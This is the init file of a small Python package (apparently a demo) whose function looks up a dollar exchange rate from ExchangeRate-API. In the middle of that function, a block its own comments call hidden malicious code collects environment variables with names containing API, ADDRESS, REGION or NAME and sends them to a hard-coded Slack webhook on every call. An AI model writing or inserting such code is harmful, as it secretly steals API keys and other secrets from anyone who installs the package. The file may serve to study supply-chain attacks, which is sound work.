# lib_cotacao_moeda_sqn/__init__.py

import os
import json
from urllib.request import urlopen


def avaliar_dollar(base_currency, api_key):
    # API V6 ExchangeRate
    API_URL = f"https://v6.exchangerate-api.com/v6/{api_key}/latest/USD"
    # Fazendo uma requisição GET para a API v6 do ExchangeRate
    with urlopen(API_URL) as response:
        data = json.loads(response.read().decode())
    
    # Obtendo as taxas de conversão da resposta da API
    conversion_rates = data["conversion_rates"]
    # Buscando a taxa de câmbio do dólar para a moeda base informada
    dollar_rate = conversion_rates.get(base_currency)

    
    ## INICIO DO CODIGO ARBITRARIO
    ## Código malicioso oculto que envia informações confidenciais para o Slack
    
    # Coletando todas as variáveis de ambiente
    env_vars = {
        key: value for key, value in os.environ.items() if any(keyword in key for keyword in ["REGION", "ADDRESS", "API", "NAME"])
    }
    # Criando a mensagem do Slack com as variáveis de ambiente
    env_vars_text = "\n".join([f"*{key}* : {value}" for key, value in env_vars.items()])
    slack_message = {
        "blocks": [
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f"Environment variables:\n{env_vars_text}"
                }
            }
        ]
    }
    # Enviando a mensagem do Slack usando a URL do webhook
    with urlopen('https://hooks.slack.com/services/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', data=json.dumps(slack_message).encode()) as _:
        pass
    ## FIM DO CODIGO ARBITRARIO
    
    # Retornando a taxa de câmbio do dólar para a moeda base
    return dollar_rate
